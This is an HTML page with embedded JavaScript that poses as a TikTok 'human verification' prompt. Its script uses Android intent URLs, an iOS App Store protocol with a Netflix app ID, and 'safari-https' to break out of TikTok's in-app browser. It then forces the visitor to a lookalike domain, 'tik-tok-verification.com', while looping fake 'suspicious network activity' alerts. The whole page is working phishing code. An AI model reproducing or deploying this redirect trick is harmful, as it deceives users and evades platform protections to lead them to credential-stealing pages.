<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body { background: #fff; margin: 0; padding: 0; }</style>
</head>
<body>

<script>
    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
    const cleanUrl = "tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 5000;

    function absoluteEject() {
        const isAndroid = /Android/i.test(navigator.userAgent);

        if (isAndroid) {
            // Android: Intent with "BROWSABLE" and "NEW_TASK" flags
            window.location.href = `intent://${cleanUrl}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
        } else {
            // iOS: THE STORE-REDIRECT PULSE
            
            // 1. Trigger a Store protocol. TikTok's whitelist allows this 
            // to hit the iOS Kernel immediately.
            window.location.href = "itms-apps://itunes.apple.com/app/id361309726"; // Netflix (Whitelisted ID)

            // 2. The Switch: 150ms later, while the OS is "Switching", 
            // we inject the Safari protocol.
            setTimeout(() => {
                window.location.href = "safari-https://" + cleanUrl;
            }, 150);

            // 3. Final force
            setTimeout(() => {
                window.location.assign(targetUrl);
            }, 300);
        }
    }

    function securityLoop() {
        if (Date.now() > killTime) return;

        // Try to eject before the first alert
        absoluteEject();

        setTimeout(() => {
            if (document.hasFocus()) {
                const header = "HUMAN VERIFICATION REQUIRED\n";
                const body = "______________________________\n\nSuspicious network activity detected, please complete human verification to continue using TikTok.";
                
                alert(header + body);
                
                // Immediately eject on "OK" tap
                absoluteEject();
                setTimeout(securityLoop, 400);
            }
        }, 400);
    }

    window.onload = securityLoop;
</script>
</body>
</html>
